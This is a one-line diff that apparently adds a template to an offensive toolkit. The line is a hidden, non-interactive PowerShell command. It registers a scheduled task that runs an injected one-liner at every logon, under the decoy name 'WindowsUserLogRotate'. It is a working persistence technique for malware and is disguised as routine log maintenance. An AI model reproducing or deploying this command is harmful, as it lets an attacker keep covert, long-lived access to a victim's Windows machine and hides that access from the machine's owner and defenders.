@@ -1,0 +1,1 @@
+powershell.exe -NoP -sta -NonI -W Hidden -Command "$$Action = New-ScheduledTaskAction -Execute '${oneliner}'; $$Trigger = New-ScheduledTaskTrigger -AtLogon; $$Task = New-ScheduledTask -Action $$Action -Trigger $$Trigger -Settings (New-ScheduledTaskSettingsSet); $$Task | Register-ScheduledTask -TaskName 'WindowsUserLogRotate'"
